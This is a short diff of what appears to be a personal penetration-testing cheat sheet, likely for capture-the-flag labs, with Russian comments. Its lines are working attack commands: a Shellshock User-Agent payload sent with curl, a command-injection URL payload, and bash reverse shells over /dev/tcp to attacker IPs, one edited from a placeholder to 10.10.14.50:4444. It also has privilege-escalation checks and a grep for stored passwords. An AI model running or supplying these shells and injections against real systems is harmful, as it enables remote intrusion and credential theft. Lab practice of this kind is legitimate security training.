@@ -32,7 +32,7 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&
 
 http://localhost.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.61/4242 0>&1"`'}
 
-bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
 
 Sudo -l
 find hacker -exec whoami \;
@@ -86,4 +86,5 @@ cat * | grep -i passw*
 
 # Найти запущенные процессы 
 ps -aux
+
 pspy64 (Надо скачивать)
